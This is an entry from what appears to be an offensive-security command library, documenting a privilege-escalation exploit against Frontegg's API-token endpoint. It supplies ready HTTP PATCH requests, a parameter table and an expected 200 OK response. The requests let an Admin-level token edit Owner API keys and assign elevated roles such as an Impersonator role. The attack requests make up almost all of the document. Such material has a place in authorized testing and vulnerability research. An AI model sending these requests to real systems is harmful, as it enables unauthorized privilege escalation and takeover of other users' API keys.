---
id: cmd-frontegg-patch-001
data: >-
  PATCH /frontegg/identity/resources/tenants/api-tokens/v1/<API_KEY_ID> HTTP/1.1

  Host: your-frontegg-instance.com

  Authorization: Bearer <ADMIN_TOKEN>

  Content-Type: application/json


  {"description":"desc111111","roleIds":["c22321ba-8ece-426d-b418-ece2a6d72009"]}
tags:
  - api-patch
  - frontegg
  - privilege-escalation
type: command
output: HTTP 200 OK with updated key details
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:29.166Z'
verified: false
validated: true
submitted: true
---
# frontegg-patch-api-key

## Command

```http
PATCH /frontegg/identity/resources/tenants/api-tokens/v1/<API_KEY_ID> HTTP/1.1
Host: your-frontegg-instance.com
Authorization: Bearer <ADMIN_TOKEN>
Content-Type: application/json

{"description":"desc111111","roleIds":["c22321ba-8ece-426d-b418-ece2a6d72009"]}
```

## Description

Updates an API key's description and roleIds via PATCH request, exploiting broken access control to allow Admin edits on Owner keys.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| API_KEY_ID | Unique identifier of the API key to edit | Yes |
| ADMIN_TOKEN | Bearer token from Admin session | Yes |
| description | New description string | No |
| roleIds | Array of role UUIDs (e.g., Impersonator) | No |

## Examples

### Basic Usage

```http
PATCH /frontegg/identity/resources/tenants/api-tokens/v1/abc123 HTTP/1.1
Host: app.frontegg.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{"description":"Modified by Admin"}
```

### Advanced Usage

Escalate role:

```http
PATCH /frontegg/identity/resources/tenants/api-tokens/v1/abc123 HTTP/1.1
Host: app.frontegg.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{"description":"Escalated","roleIds":["c22321ba-8ece-426d-b418-ece2a6d72009"]}
```

## Expected Output

HTTP 200 OK with JSON response showing updated fields, e.g., {"description":"desc111111","roleIds":["c22321ba-8ece-426d-b418-ece2a6d72009"] }.

## Related

- [[commands/frontegg-delete-api-key]]
- [[procedures/Execute-PATCH-and-Verify-API-Key-Edit]]
